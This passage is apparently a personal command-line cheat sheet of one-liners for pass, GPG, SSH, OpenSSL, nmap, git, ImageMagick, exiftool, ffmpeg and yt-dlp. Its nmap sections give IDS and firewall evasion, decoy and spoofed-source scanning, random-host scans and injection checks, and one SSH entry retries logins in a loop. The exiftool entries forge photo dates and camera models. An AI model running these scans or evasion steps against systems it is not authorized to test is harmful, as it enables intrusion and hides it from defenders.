($) Remove password for somecompany: `pass rm somecompany`
($) find existing passwords that match "company": `pass find *company*`
($) Add additional info to a password (add info separate lines): `pass edit somecompany`

GPG - GNUPG
===========
($) Sign `doc.txt` without encryption (writes output to `doc.txt.asc`): `gpg --clearsign doc.txt`
($) Encrypt `doc.txt` for alice@example.com (output to `doc.txt.gpg`): `gpg --encrypt --recipient alice@example.com doc.txt`
($) Encrypt `doc.txt` with only a passphrase (output to `doc.txt.gpg`): `gpg --symmetric doc.txt`
($) Decrypt `doc.txt.gpg` (output to stdout): `gpg --decrypt doc.txt.gpg`
($) Import a public key: `gpg --import public.gpg`
($) Export public key for alice@example.com (output to stdout): `gpg --export --armor alice@example.com`
($) Export private key for alice@example.com (output to stdout): `gpg --export-secret-keys --armor alice@example.com`

SSH - OPENSSH (THANKS, PUFFY!)
==============================
($) Connect to a server using SSH: `ssh user@host`
($) Generate a SSH key: `ssh-keygen`
($) Generate SSH public key from the private key: `ssh-keygen -y -f privatekey.pem > publickey.pem`
($) Copy `~/.ssh/id_rsa.pub` to remote-server.org: `$ ssh-copy-id -i ~/.ssh/is_rsa.pub username@remote-server.org`
($) (Powershell) Copy SSH id without ssh-copy-id: `Get-Contents ~/.ssh/id_rsa.pub | ssh user@123.45.67.89 "cat >> ~/.ssh/authorized_keys"`
($) Sometimes SSH still won't use your key - make sure you've added it: `eval "$(ssh-agent -s) && ssh-add ~/.ssh/NAMEOFYOURKEY`
($) SSH connection through host in the middle: `ssh -J user@reachable_host user@unreacheable_host`
($) Specify the ID and port that SSH should use: `$ ssh-copy-id -i ~/.ssh/id_ed25519.pub -p 221 username@remote-server.org`
($) Copy a file to a remote server: `scp path/to/local_file user@host:/path/remote_file`
($) Make an encrypted archive of local dir/ on remote machine using ssh: `tar -c dir/ | gzip | gpg -c | ssh user@remote 'dd of=dir.tar.gz.gpg'`
($) Use a specific key to copy a file: `scp -i ~/.ssh/private_key local_file remote_host:/path/remote_file`
($) Infinite loop ssh: `while true; do ssh login@10.0.0.1; if [[ $? -ne 0 ]]; then echo "Nope, keep trying!"; fi; sleep 10; done`
($) Port forwarding: `ssh -L8888:localhost:80 -i nov15a.pem ubuntu@123.21.167.60`
($) Append a pub key from pem file and save in remote server accessing with another key: `ssh-keygen -y -f user-key.pem | ssh user@host -i already_on_remote_server_key.pem 'cat >> ~/.ssh/authorized_keys'`
($) Backup VPS disk to another host: `ssh root@vps.example -p22 "cat /dev/sda1 | gzip -1 - " > vps.sda1.img.gz`
($) Test your bash skills: `ssh bandit0@bandit.labs.overthewire.org -p 2220`

OPENSSL
=======
($) Encrypt a file using OpenSSL: `openssl aes-256-cbc -a -salt -iter 5 -in data.tar.gz -out data.enc`
($) Decrypt a file using OpenSSL: `openssl aes-256-cbc -d -a -iter 5 -in data.enc -out data_decrypted.tar.gz`
($) List SAN domains for a certificate: `echo | openssl s_client -connect google.com:443 2>&1 | openssl x509 -noout -text |  awk -F, -v OFS="\n" '/DNS:/{x=gsub(/ *DNS:/, ""); $1=$1; print $0}'`
($) Download certificate from FTP: `echo | openssl s_client -servername ftp.domain.com -connect ftp.domain.com:21 -starttls ftp 2>/dev/null | sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p'`
($) Download certificate chain from FTP: `echo | openssl s_client -showcerts -connect ftp.domain.com:ftp -starttls ftp 2>/dev/null | sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p'`
($) Check SSL expiry from commandline: `echo | openssl s_client -showcerts -servername google.com -connect gnupg.org:443 2>/dev/null | openssl x509 -inform pem -noout -text`
($) SHA256 signature sum check of file: `openssl dgst -sha256  <FILENAME>`
($) Generate a random password 30 characters long: `openssl rand -rand /dev/urandom -base64 30`
($) Openssl Generate Self Signed SSL Certifcate: `openssl req -newkey rsa:2048 -nodes -keyout /etc/ssl/private/myblog.key -x509 -days 365 -out /etc/ssl/private/myblog.pem`
($) Generate a certificate signing request (CSR) for an existing private key. CSR.csr MUST be exists before: `openssl req -out CSR.csr -key privateKey.key -new`
($) Generate a new private key and Certificate Signing Request. CSR.csr MUST be extist before !: `openssl req -out CSR.csr -new -newkey rsa:2048 -nodes -keyout privateKey.key`
($) Generate pem cert from host with ssl port: `openssl s_client -connect HOSTNAME.at:443 -showcerts </dev/null 2>/dev/null | openssl x509 -outform PEM > meinzertifikat.pem`
($) Download SSL/TLS pem format cert from https web host: `openssl s_client -showcerts -connect google.com:443 </dev/null 2>/dev/null | openssl x509 -outform PEM > /tmp/google.com.cer`
($) Host cpu performance: `openssl speed md5`
($) Finding the fingerprint of a given certificate: `openssl x509 -in cert.pem -fingerprint -noout`
($) Generate a certificate signing request based on an existing certificate. certificate.crt MUST be exists before !: `openssl x509 -x509toreq -in certificate.crt -out CSR.csr -signkey privateKey.key`
($) Connect to a server and show full certificate chain: `openssl s_client -showcerts -host example.com -port 443 </dev/null`
($) Encrypted archive with openssl and tar: `tar --create --file - --posix --gzip -- <dir> | openssl enc -e -aes256 -out <file>`

NMAP TARGET SPECIFICATION
=========================
($) Scan a single IP: `nmap 192.168.1.1`
($) Scan specific IPs: `nmap 192.168.1.1 192.168.2.1`
($) Scan a range: `nmap 192.168.1.1-254`
($) Scan a domain: `nmap scanme.nmap.org`
($) Scan using CIDR notation: `nmap 192.168.1.0/24`
($) Scan targets from a file: `nmap -iL targets.txt`
($) Scan 100 random hosts: `nmap -iR 100`
($) Exclude listed hosts: `nmap --exclude 192.168.1.1`

NMAP SCAN TECHNIQUES
====================
($) TCP SYN port scan (Default): `nmap 192.168.1.1 -sS`
($) TCP connect port scan (Default without root privilege): `nmap 192.168.1.1 -sT`
($) UDP port scan: `nmap 192.168.1.1 -sU`
($) TCP ACK port scan: `nmap 192.168.1.1 -sA`
($) TCP Window port scan: `nmap 192.168.1.1 -sW`
($) TCP Maimon port scan: `nmap 192.168.1.1 -sM`

NMAP HOST DISCOVERY
===================
($) No Scan. List targets only: `nmap 192.168.1.1-3 -sL`
($) Disable port scanning. Host discovery only.: `nmap 192.168.1.1/24 -sn`
($) Disable host discovery. Port scan only.: `nmap 192.168.1.1-5 -Pn`
($) TCP SYN discovery on port x. Port 80 by default: `nmap 192.168.1.1-5 -PS22-25,80`
($) TCP ACK discovery on port x. Port 80 by default: `nmap 192.168.1.1-5 -PA22-25,80`
($) UDP discovery on port x. Port 40125 by default: `nmap 192.168.1.1-5 -PU53`
($) ARP discovery on local network: `nmap 192.168.1.1-1/24 -PR`
($) Never do DNS resolution: `nmap 192.168.1.1 -n`
($) Display live hosts on the network: `nmap -sP "$(ip -4 -o route get 1 | cut -d ' ' -f 7)"/24 | grep report | cut -d ' ' -f 5-`
($) Quickly ping range of IP adresses and return only those that are online: `nmap -sP 192.168.0.0/24`
($) Dump top 10 ports tcp/udp from nmap: `nmap -oA derp --top-ports 10 localhost>/dev/null;grep 'services\=' derp.xml | sed -r 's/.*services\=\"(.*)(\"\/>)/\1/g'`

NMAP PORT SPECIFICATIONS
========================
($) Port scan for port x: `nmap 192.168.1.1 -p 21`
($) Port range: `nmap 192.168.1.1 -p 21-100`
($) Port scan multiple TCP and UDP ports: `nmap 192.168.1.1 -p U:53,T:21-25,80`
($) Port scan all ports: `nmap 192.168.1.1 -p-`
($) Port scan from service name: `nmap 192.168.1.1 -p http,https`
($) Fast port scan (100 ports): `nmap 192.168.1.1 -F`
($) Port scan the top x ports: `nmap 192.168.1.1 --top-ports 2000`
($) Leaving off initial port in range makes the scan start at port 1: `nmap 192.168.1.1 -p-65535`
($) Leaving off end port in range makes the scan go through to port 65535: `nmap 192.168.1.1 -p0-`

NMAP SERVICE AND VERSION DETECTION
==================================
($) Attempts to determine the version of the service running on port: `nmap 192.168.1.1 -sV`
($) Intensity level 0 to 9. Higher number increases possibility of correctness: `nmap 192.168.1.1 -sV --version-intensity 8`
($) Enable light mode. Lower possibility of correctness. Faster: `nmap 192.168.1.1 -sV --version-light`
($) Enable intensity level 9. Higher possibility of correctness. Slower: `nmap 192.168.1.1 -sV --version-all`
($) Enables OS detection, version detection, script scanning, and traceroute: `nmap 192.168.1.1 -A`

NMAP OS DETECTION
=================
($) Remote OS detection using TCP/IP stack fingerprinting: `nmap 192.168.1.1 -O`
($) If at least one open and one closed TCP port are not found it will not try OS detection against host: `nmap 192.168.1.1 -O --osscan-limit`
($) Makes Nmap guess more aggressively: `nmap 192.168.1.1 -O --osscan-guess`
($) Set the maximum number x of OS detection tries against a target: `nmap 192.168.1.1 -O --max-os-tries 1`
($) Enables OS detection, version detection, script scanning, and traceroute: `nmap 192.168.1.1 -A`

NMAP TIMING AND PERFORMANCE
===========================
($) Paranoid (0) Intrusion Detection System evasion: `nmap 192.168.1.1 -T0`
($) Sneaky (1) Intrusion Detection System evasion: `nmap 192.168.1.1 -T1`
($) Polite (2) slows down the scan to use less bandwidth and use less target machine resources: `nmap 192.168.1.1 -T2`
($) Normal (3) which is default speed: `nmap 192.168.1.1 -T3`
($) Aggressive (4) speeds scans; assumes you are on a reasonably fast and reliable network: `nmap 192.168.1.1 -T4`
($) Insane (5) speeds scan; assumes you are on an extraordinarily fast network: `nmap 192.168.1.1 -T5`

NMAP NSE SCRIPTS
================
($) Scan with default NSE scripts. Considered useful for discovery and safe: `nmap 192.168.1.1 -sC`
($) Scan with default NSE scripts. Considered useful for discovery and safe: `nmap 192.168.1.1 --script default`
($) Scan with a single script. Example banner: `nmap 192.168.1.1 --script=banner`
($) Scan with a wildcard. Example http: `nmap 192.168.1.1 --script=http*`
($) Scan with two scripts. Example http and banner: `nmap 192.168.1.1 --script=http,banner`
($) Scan default, but remove intrusive scripts: `nmap 192.168.1.1 --script "not intrusive"`
($) NSE script with arguments: `nmap --script snmp-sysdescr --script-args snmpcommunity=admin 192.168.1.1`

NMAP USEFUL NSE SCRIPT EXAMPLES
===============================
($) http site map generator: `nmap -Pn --script=http-sitemap-generator scanme.nmap.org`
($) Fast search for random web servers: `nmap -n -Pn -p 80 --open -sV -vvv --script banner,http-title -iR 1000`
($) Brute forces DNS hostnames guessing subdomains: `nmap -Pn --script=dns-brute domain.com`
($) Safe SMB scripts to run: `nmap -n -Pn -vv -O -sV --script smb-enum*,smb-ls,smb-mbenum,smb-os-discovery,smb-s*,smb-vuln*,smbv2* -vv 192.168.1.1`
($) Whois query: `nmap --script whois* domain.com`
($) Detect cross site scripting vulnerabilities: `nmap -p80 --script http-unsafe-output-escaping scanme.nmap.org`
($) Check for SQL injections: `nmap -p80 --script http-sql-injection scanme.nmap.org`
($) Example IDS Evasion command: `nmap -f -t 0 -n -Pn –data-length 200 -D 192.168.1.101,192.168.1.102,192.168.1.103,192.168.1.23 192.168.1.1`

NMAP FIREWALL / IDS EVASION AND SPOOFING
========================================
($) Requested scan (including ping scans) use tiny fragmented IP packets. Harder for packet filters: `nmap 192.168.1.1 -f`
($) Set your own offset size: `nmap 192.168.1.1 --mtu 32`
($) Send scans from spoofed IPs: `nmap -D 192.168.1.101,192.168.1.102, 192.168.1.103,192.168.1.23 192.168.1.1`
($) Above example explained: `nmap -D decoy-ip1,decoy-ip2,your-own-ip,decoy-ip3,decoy-ip4 remote-host-ip`
($) Scan Facebook from Microsoft (-e eth0 -Pn may be required): `nmap -S www.microsoft.com www.facebook.com`
($) Use given source port number: `nmap -g 53 192.168.1.1`
($) Relay connections through HTTP/SOCKS4 proxies: `nmap --proxies http://192.168.1.1:8080, http://192.168.1.2:8080 192.168.1.1`
($) Appends random data to sent packets: `nmap --data-length 200 192.168.1.1`

NMAP OUTPUT
===========
($) Normal output to the file normal.file: `nmap 192.168.1.1 -oN normal.file`
($) XML output to the file xml.file: `nmap 192.168.1.1 -oX xml.file`
($) Grepable output to the file grep.file: `nmap 192.168.1.1 -oG grep.file`
($) Output in the three major formats at once: `nmap 192.168.1.1 -oA results`
($) Grepable output to screen.: `nmap 192.168.1.1 -oG -`
($) Nmap get all active online ips  from specific network: `nmap -n -sn 192.168.1.0/24 -oG - | awk '/Up$/{print $2}'`
($) Network Discover in a one liner: `nmap -sn 192.168.1.0/24 -oG - | awk '$4=="Status:" && $5=="Up" {print $0}'|column -t`
($) Append a scan to a previous scan file: `nmap 192.168.1.1 -oN file.file --append-output`
($) Increase the verbosity level (use -vv or more for greater effect): `nmap 192.168.1.1 -v`
($) Increase debugging level (use -dd or more for greater effect): `nmap 192.168.1.1 -d`
($) Display the reason a port is in a particular state, same output as -vv: `nmap 192.168.1.1 --reason`
($) Only show open (or possibly open) ports: `nmap 192.168.1.1 --open`
($) Show all packets sent and received: `nmap 192.168.1.1 -T4 --packet-trace`
($) Shows the host interfaces and routes: `nmap --iflist`
($) Resume a scan: `nmap --resume results.file`

HELPFUL NMAP OUTPUT EXAMPLES
============================
($) Scan for web servers and grep to show which IPs are running web servers: `nmap -p80 -sV -oG - --open 192.168.1.1/24 | grep open`
($) Generate a list of the IPs of live hosts: `nmap -iR 10 -n -oX out.xml | grep "Nmap" | cut -d " " -f5 > live-hosts.txt`
($) Append IP to the list of live hosts: `nmap -iR 10 -n -oX out2.xml | grep "Nmap" | cut -d " " -f5 >> live-hosts.txt`
($) Append IP to the list of live hosts: `ndiff scanl.xml scan2.xml`
($) Convert nmap xml files to html files: `xsltproc nmap.xml -o nmap.html`
($) Convert nmap xml files to html files: `grep " open " results.nmap | sed -r 's/ +/ /g' | sort | uniq -c | sort -rn | less`

NMAP MISCELLANEOUS OPTIONS
==========================
($) Discovery only on ports x, no port scan: `nmap -iR 10 -PS22-25,80,113,1050,35000 -v -sn`
($) Arp discovery only on local network, no port scan: `nmap 192.168.1.1-1/24 -PR -sn -vv`
($) Traceroute to random targets, no port scan: `nmap -iR 10 -sn -traceroute`
($) Query the Internal DNS for hosts, list targets only: `nmap 192.168.1.1-50 -sL --dns-server 192.168.1.1`

FONTS
=====
($) Search for installed fonts: `fc-list`
($) How to find out what fonts `st` is using: `lsof -p $(ps -o pid --no-headers -C st) | grep fonts`

GIT
===
($) Initialize a git repo in the current directory: `git init`
($) Make some changes to a file and add it to the next commit: `git add FILE`
($) Commit your changes with a message: `git commit -m "changes happened"`
($) Get status but don't show untracked files: `git status -uno`
($) Oops, your last commit message was wrong. Amend it: `git commit --amend -m "changes happened to FILE"`
($) Dang it, you also forgot to add a file with the last commit: `git add FILE && git commit --amend --no-edit`

($) List the branches available to git: `git branch`
($) You're ready for something new. Make a new branch: `git checkout NAMEOFBRANCH`
($) Make a new branch and carry over staged files: `git checkout -b name-of-new-branch`
($) Stage files from another branch: `git checkout NAMEOFTHEBRANCH FILE1 FILE2`
($) Revert a file to a version seen in COMMITREF: `git checkout COMMITREF -- file1/to/restore`

($) You want to save your changes, but not commit them (yet). Stash: `git stash save MyStashedChanges`
($) What stashed changes do I have?: `git stash list`
($) Apply some stashed changes (use `stash list` to find your index integer): `git stash apply INDEX`

($) Compare two branches with a simple summary: `git diff --compact-summary <branch1> <branch2>`
($) Delete all local git branches that have been merged and deleted from remote: `git branch -d $( git branch -vv | grep '\[[^:]\+: gone\]' | awk '{print $1}' | xargs )`
($) (Powershell) Delete all local branches that have been merged into master: `git branch --merged origin/master | Where-Object {  !$_.Contains('master') } | ForEach-Object { git branch -d $_.trim() }`
($) Cleanup remote git repository of all branches already merged into master: `git branch --remotes --merged | grep -v master | sed 's@ origin/@:@' | xargs git push origin`
($) (Powershell) Delete all local branches that are not master: `git branch | Where-Object { !$_.Contains('master') } | ForEach-Object { git branch -D $_.Trim() }`
($) (Powershell) Copy current branch to clipboard: `(git branch | Where-Object { $_.Contains('*') } | Select-Object -First 1).Trim('*').Trim() | Set-Clipboard`
($) (Powershell) Initialise git in working directory with latest Visual Studio .gitignore: `git init; (Invoke-WebRequest https://raw.githubusercontent.com/github/gitignore/master/VisualStudio.gitignore -UseBasicParsing).Content | Out-File -FilePath .gitignore -Encoding utf8; git add -A`
($) Get full git commit history of single file: `git log -p --name-only --follow <file>`
($) Open browser from terminal to create PR after pushing something in Git: `git remote -v | grep origin| tail -1| awk '{print $2}'| cut -d"@" -f2| sed 's/:/\//g'| xargs -I {} $BROWSER https://{}`
($) Print GitHub url for the current url: `git remote -v | sed -n '/github.com.*push/{s/^[^[:space:]]\+[[:space:]]\+//;s|git@github.com:|https://github.com/|;s/\.git.*//;p}'`
($) Push to all (different) remotes in git directory without having to combine them.: `git remote | while read line ; do git push $line; done`
($) (Powershell) Stage all files for commit except those that are *.config at any level within your git repo: `git status | Where-Object {$_.Contains('modified') -and !$_.Contains('.config')} | ForEach-Object { git add $_.Replace('modified:','').Trim() }`
($) Show contents of all git objects in a git repo: `find .git/objects/ -type f \| sed 's/\.git\/objects\/\///' | sed 's/\///g' | xargs -n1 -I% echo echo "%" \$\(git cat-file -p "%"\) \0 | xargs -n1 -0 sh -c`
($) Print all git repos from a user: `USERNAME=username && curl -s https://api.github.com/users/${USERNAME}/repos?per_page=1000 | grep git_url | awk '{print $2}'| sed 's/"\(.*\)",/\1/'`
($) Print all git repos from a user (only curl and grep): `USERNAME=username && curl -s https://api.github.com/users/${USERNAME}/repos?per_page=1000 | grep -oP '(?<="git_url": ").*(?="\,)'`
($) Print all git repos from a user: `USERNAME=username && curl -s "https://api.github.com/users/${USERNAME}/repos?per_page=1000" | jq '.[].git_url'`
($) Print all git repos from a user: `USERNAME=username && curl -s "https://api.github.com/users/${USERNAME}/repos?per_page=1000" | python <(echo "import json,sys;v=json.load(sys.stdin);for i in v:; print(i['git_url']);" | tr ';' '\n')`
($) (Powershell) Pull multiple repositories in child folders (a.k.a. I'm back from leave script): `gci -Directory | foreach {Push-Location $_.Name; git fetch --all; git checkout master; git pull; Pop-Location}`
($) See where settings are coming from: `git config --show-origin --list`
($) Nice git aliases to visualize git log: `git config --global alias.lg2 "log --graph --abbrev-commit --decorate --format=format:'%C(bold blue)%h%C(reset) - %C(bold cyan)%aD%C(reset) %C(bold green)(%ar)%C(reset)%C(bold yellow)%d%C(reset)%n''%C(white)%s%C(reset) %C(dim white)- %an%C(reset)' --all"`

($) Create a multi-patch from the current checked-branch: `git format-patch --singoff master --stdout > multi.diff`
TODO (*) Apply a patch

IMAGE MAGICK
============
($) Convert image formats: `magick in.jpg out.gif`
($) Resize an image to 100px wide: `magick image.jpg -resize 100x image_smaller.jpg`
($) Scale an image to 25% of width: `magick image.jpg -resize 25%x image_smaller.jpg`
($) Resize all images in directory to 25% of original: `mogrify -scale 25% -path ./thumbs *.*`
($) Change all JPG images to PNG in a directory: `mogrify -format png *.jpg`
($) Changing all JPGs to a width of 120px and save as PNG: `magick '*.jpg' -resize 120x thumbnail%03d.png`
($) JPG -> JPG good compression (small loss of quality): `convert in.jpg -sampling-factor 4:2:0 -strip -quality 85 -interlace JPEG -colorspace sRGB out.jpg`
($) PNG -> PNG good compression (usually): `convert in.png -define png:compression-filter=2 -define png:compression-level=9 -define png:compression-strategy=1 out.png`
($) Crop an image: `magick in.png -crop 200x300+20+20 cropped.png`
($) Change all white pixels in an image to transparent: `convert in.jpg -transparent white out.png`
($) Replace transperancy with white background: `convert in.png -flatten out.jpg`
($) Print DateTimeOriginal from EXIF data for all files in folder: `for i in *.jpg; do identify -format %[EXIF:DateTimeOriginal] $i; echo; done`
($) "Diff" two images (first shows the result as a PNG, second as a PDF): `compare image1 image2 -compose src diff.png`
($) Calculate a hash of image data (ImageMagick): `identify -quiet -format "%#" "./path/to/file"`
($) List all fonts available to ImageMagick: `convert -list font`
($) Convert stdout text to image: `convert -background lightblue -fill blue -font DejaVu-Sans-Mono-Book -pointsize 72 label:@- cal.gif <<< $(cal)`
($) Combine `cal` calendar output with an image: `convert -font DejaVu-Sans-Mono-Book -fill '#0008' -draw 'rectangle 200,180,960,680' -fill white -pointsize 50 -draw "text 270,260 \" `cal` \"" bg.png bgcal.png`
($) Convert a PDF with images to a smaller size: `convert -density 200x200 -quality 60 -compress jpeg input.pdf output.pdf`
($) Extract text from an image (requires `tesseract`): `convert -colorspace gray -fill white -resize 480% -sharpen 0x1 in.png out.jpg && tesseract out.jpg out.txt`
($) Convert all images (png) in a folder to webp using all available cores: `parallel magick {} {.}.webp ::: *.png`

EXIFTOOL
========
($) Exiftool adjust Date & Time of pictures: `"exiftool(-k).exe" "-DateTimeOriginal-=0:0:0 0:25:0" .`
($) Remove all cached images for icons related to your profile: `DEL /F /S /Q /A %LocalAppData%\Microsoft\Windows\Explorer\thumbcache_*.db`
($) Edit Camera Model in metadata:: `exiftool -model="Samsung Galaxy S11 PRO EDITION " a.jpg`
($) Manipulate the metadata and edit the create time (This will change date to 1986:11:05 12:00 - Date: 1986 5th November, Time: 12.00) and then it will set modify date to the same as alldate.: `exiftool "-AllDates=1986:11:05 12:00:00" a.jpg; exiftool "-DateTimeOriginal>FileModifyDate" a.jpg`
($) Manipulate the metadata when the photo was taken, this will shift with +15hours + 30min: `exiftool "-DateTimeOriginal+=0:0:0 15:30:0" a.jpg`
($) Extract all GPS positions from a AVCHD video.: `exiftool -ee -p "$gpslatitude, $gpslongitude, $gpstimestamp" a.m2ts`
($) Use CreationDate metadata on .mov files to rename and modify the created/modify file dates on Mac: `exiftool '-MDItemFSCreationDate<CreationDate' '-FileModifyDate<CreationDate' '-filename<CreationDate' -d %Y-%m-%d_%H-%M-%S%%+c.%%le . -ext mov`

MORE IMAGE MANIPULATION AND PROCESSING
======================================
($) Convert raw camera image to jpeg: `for i in *.CR2; do ufraw-batch $i --out-type=jpeg --output $i.jpg; done;`
($) Check a directory of PNG files for errors: `ls *.png |parallel --nice 19 --bar --will-cite "pngcheck -q {}"`

PULSEAUDIO
==========
($) Set the volume of sink 1 to 75%: `pactl set-sink-volume 1 0.75`
($) Set the volume to 75% on the default sink: `pamixer --set-volume 75`
($) Toggle mute on the default sink (using the special name `@DEFAULT_SINK@`): `pactl set-sink-mute @DEFAULT_SINK@ toggle`
($) Toggle mute on a sink other than the default: `pamixer --toggle-mute --sink ID`
($) Increase the volume on default sink by 5%: `pamixer --increase 5`
($) Decrease the volume on a source by 5%: `pamixer --decrease 5 --source ID`
($) Move sink-input 627 to sink 1: `pactl move-sink-input 627 1`
($) Use the allow boost option to increase, decrease, or set the volume above 100%: `pamixer --set-volume 105 --allow-boost`
($) Mute the default sink (use `--unmute` instead to unmute): `pamixer --mute`
($) Switch all connected PulseAudio bluetooth devices to A2DP profile: `for card in $(pacmd list-cards | grep 'name: ' | sed 's/.*<\(.*\)>.*/\1/'); do pacmd set-card-profile $card a2dp_sink; done`

($) Change the default sink (output) to 1: `pactl set-default-sink 1`
($) List all sinks and sources with their corresponding IDs: `pamixer --list-sinks --list-sources`
($) List all sources: `LANG=C pactl list | grep -A2 'Source #' | grep 'Name: ' | cut -d" " -f2`
($) List all sinks: `pactl list sinks short`
($) Create a sink: `pacmd load-module module-null-sink sink_name=MySink && pacmd update-sink-proplist MySink device.description=MySink`

($) List all sinks (or other types - sinks are outputs and sink-inputs are active audio streams): `pactl list sinks short`
($) Change the default sink (output) to 1 (the number can be retrieved via the `list` subcommand): `pactl set-default-sink 1`
($) Move sink-input 627 to sink 1: `pactl move-sink-input 627 1`
($) Set the volume of sink 1 to 75%: `pactl set-sink-volume 1 0.75`
($) Toggle mute on the default sink (using the special name `@DEFAULT_SINK@`): `pactl set-sink-mute @DEFAULT_SINK@ toggle`

FFMPEG (SIMPLE)
===============
($) Use the vp9 encoder for awesome (slow) compression: `$FILE=myfile.webm && ffmpeg -i $FILE -c:v libvpx-vp9 -c:a libopus -crf 38 ${FILE%.*}.webm`
($) Convert a video using CRF (0 is best, 50 is not watchable): `ffmpeg -i input.mp4 -vcodec libx265 -crf 28 output.mp4`
($) Convert video for max compatibility and web viewing (2019): `ffmpeg -i final3.mp4 -c:v libx264 -crf 40 -profile:v baseline -level 3.0 -pix_fmt yuv420p -movflags faststart final3_264.mp4`
($) Clip a video starting at 35 min 10 sec to 37 min 29 sec: `ffmpeg -ss 00:35:10 -i original.mp4 -to 00:37:29 -c copy out.mp4`
($) Clip a video starting at 35 min 10 sec, 1 min 34 sec duration: `ffmpeg -ss 00:35:10.0 -i input.wmv -t 00:01:34 -c copy output.wmv`
($) 0 = 90° rotate counter-clockwise and vertical flip (default): `ffmpeg -i in.mov -vf "transpose=0" out.mov`
($) 1 = 90° rotate clockwise: `ffmpeg -i in.mov -vf "transpose=1" out.mov`
($) 2 = 90° rotate counter-clockwise: `ffmpeg -i in.mov -vf "transpose=2" out.mov`
($) 3 = 90° rotate clockwise and vertical flip: `ffmpeg -i in.mov -vf "transpose=3" out.mov`
($) Flip a video horizontally (this way: left <-> right): `ffmpeg -i original.mp4 -vf hflip original_flipped.mp4`
($) Flip a video vertically (this way: up <-> down): `ffmpeg -i original.mp4 -vf vflip original_flipped.mp4`
($) Combine multiple images into a video using ffmpeg: `ffmpeg -start_number 0053 -r 1/5 -i IMG_%04d.JPG -c:v libx264 -vf fps=25 -pix_fmt yuv420p out.mp4`
($) Inset video. `ffmpeg -i main.mp4 -i inset.mp4 -filter_complex 'overlay=main_w-overlay_w+(1920-192*2.5):main_h-overlay_h+(1080-108*2.5)' -t 5 output.mp4`
($) Cover the main video with a transparent color: `ffmpeg -i lights.mp4 -vf 'color=color=red@.3:size=1920x1080 [over]; [in][over] overlay [out]' -t 5 output.mp4`
($) Downmix first audio stream from 7.1 to 5.1 keeping all other streams: `ffmpeg -i in.mkv -map 0 -c copy -c:a:0 aac -ac:a:0 6 out.mkv`
($) Download screenshot or frame from YouTube video at certain timestamp: `ffmpeg -ss 8:14 -i $(youtube-dl -f 299 --get-url URL) -vframes 1 -q:v 2 out.jpg`
($) ffmpeg fade from video 1 to video 2 (start at 20 seconds for 2 sec): `ffmpeg -i video1.mp4 -i video2.mp4 -filter_complex "xfade=offset=20:duration=2" v1_to_v2.mp4`
($) Sliding overlay (does it work?): `ffmpeg -i lights.mp4 -i street.mp4 -filter_complex "overlay=x='if(gte(t,2), -w+(t-2)*20, NAN)" -t 10 output.mp4`
($) Create a test video (useful for experimentation): `ffmpeg -f lavfi -i testsrc=duration=30:size=1280x720:rate=30 output.mp4`

($) Combine the video (only) from a file and an audio track: `ffmpeg -i video.mp4 -i audio.mp3 -c:v copy -map 0:v:0 -map 1:a:0 -shortest output.mp4`
($) Concatenate two or more videos read from a file (see `man ffmpeg` for proper file format): `ffmpeg -f concat -safe 0 -i mylist.txt -c copy output.mp4`
($) Stabilize a video: `ffmpeg -i video.mp4 -vf vidstabtransform=smoothing=30 video_stab.mp4`
($) Extract frames from a video: `ffmpeg -i file.mpg -r 1/1 $filename%03d.bmp`
($) Lossless conversion of a movie to mkv, adding cover art: `ffmpeg -i in.mkv -i cover.jpg -map 0 -map 1 -c copy -c:v:1 png -disposition:v:1 attached_pic -sameq out.mkv`
($) Video to gif (start at 30 seconds, 3 sec duration): `ffmpeg -ss 30 -t 3 -i VIDEO.mp4 -vf "fps=10,scale=320:-1:flags=lanczos,split[s0][s1];[s0]palettegen[p];[s1][p]paletteuse" -loop 0 OUTPUT.gif`
($) Output keyframes from all source files: `ffmpeg -skip_frame nokey -i *.mp4 -vsync 0 -r 30 -f image2 t%02d.tiff`
($) Run ffmpeg in the bg and divert messages: `ffmpeg -nostdin example.mkv &> log.txt &`

($) Write file and also play it (audio only): `ffmpeg -i "https://chillout.zone/chillout_plus" -map 0 -c:a copy -f tee "output.flac|[f=nut]pipe:" | ffplay pipe:`
($) Write file and also play it (video + audio): `ffmpeg -f v4l2 -i /dev/video0 -map 0 -c:v libx264 -f tee "output.mp4|[f=nut]pipe:" | ffplay pipe:`
($) Screen capture with mic input (ALSA): `ffmpeg -f x11grab -s 1440x900 -i :0.0 -f alsa -i hw:0 out.mkv`

FFMPEG NOISE-REDUCTION PRE-BUILT MODELS
=======================================
($) Use a highpass/lowpass filter to enhance speech: `ffmpeg -i in.mp4 -af "highpass=f=200, lowpass=f=3000" out.mp4`
($) Use RNNoise-Models to enhance speech-based audio ( https://github.com/GregorR/rnnoise-models ): `ffmpeg -i input.mp4 -af "arnndn=m=bd.rnnn" -c:v copy denoised.mp4`
($) Volume boost: `ffmpeg -i denoised.mp4 -af "volume=4" -c:v copy boosted.mp4`

YT-DLP (SORRY YOUTUBE-DL)
=========================
($) Download the best quality version of a video `yt-dlp "URL"`
($) View all available formats for a video: `yt-dlp -F "URL"`
($) Download a specific combination of video+audio - let yt-dlp decide how to combine: `yt-dlp -f248+251 "URL"`
($) Fetch stream URLs with yt-dlp (defaults to best quality stream): `yt-dlp -g "URL"`
($) Download (best) audio and convert to 'opus': `yt-dlp -x --audio-format opus "URL"`
($) Download a video but limit the size of the video to 1920x?: `yt-dlp -f 'bestvideo[width<=1920]+bestaudio' "URL"`

FFMPEG STREAMING, COMBINING MULTIPLE SOURCES, CAPTURING DEVICES
===============================================================
($) Stream a video on YouTube (the best?): `KEY="your-key-goes-here" ffmpeg -i "VIDEO_SOURCE" -c:v libx264 -preset slow -crf 18 -vf scale=out_color_matrix=bt709 -color_primaries bt709 -color_trc bt709 -colorspace bt709 -c:a aac -ar 48000 -ac 2 -b:a 320k -profile:v high -level 4.0 -bf 2 -coder 1 -pix_fmt yuv420p -b:v 10M -threads 4 -cpu-used 0 -r 60 -g 15 -movflags +faststart rtmp://a.rtmp.youtube.com/live2/$KEY`
($) Stream a video on YouTube (2nd place): `KEY="your-key-goes-here" && FPS=24 && ffmpeg -stream_loop -1 -re -i "VIDEO_SOURCE" -c:v libx264 -pix_fmt yuv420p -preset superfast -r $FPS -g $(($FPS * 2)) -b:v 1500k -c:a aac -f flv "rtmp://a.rtmp.youtube.com/live2/$KEY"`
